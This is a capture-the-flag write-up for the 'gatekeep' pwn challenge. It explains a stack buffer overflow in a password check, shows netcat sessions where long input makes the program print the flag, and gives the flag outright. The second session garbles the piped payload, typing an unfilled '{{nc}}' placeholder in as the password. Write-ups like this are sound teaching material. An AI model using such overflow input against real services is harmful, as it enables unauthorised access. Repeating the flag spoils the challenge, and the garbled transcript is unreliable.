## pwn/gatekeep

<details>
  <summary>Description</summary>
  
  > If I gaslight you enough, you won't be able to get my flag! :) <br>
  > `nc lac.tf 31121` <br>
  > Note: The attached binary is the exact same as the one executing on the remote server. <br> [Dockerfile](./Dockerfile) [gatekeep.c](./gatekeep.c) [gatekeep](./gatekeep)

</details>

This one is the basic pwn challenges, we can analyze a given binary-elf file using the IDA Disassembler.

So it's just a buffer overflow checking to see if the input is the same as the program variables in the stacks. We just need to send as many `A` as possible then the program will overwrite the input, and we get the flags.

```bash
$ nc lac.tf 31121
If I gaslight you enough, you won't be able to guess my password! :)
Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I swore that was the right password ...
Guess I couldn't gaslight you!
lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
```

Or you can use these payload `python3 -c 'print("a"*50)' | {{nc}}` that was given by the official challenges archive repo

```bash
$ nc lac.tf 31121
If I gaslight you enough, you won't be able to guess my password! :)
Password:
python3 -c 'print("a"*50)' | {{nc}}
I swore that was the right password ...
Guess I couldn't gaslight you!
lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
```

<details>
  <summary>FLAG</summary>
  
  > `lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}`
  
</details>
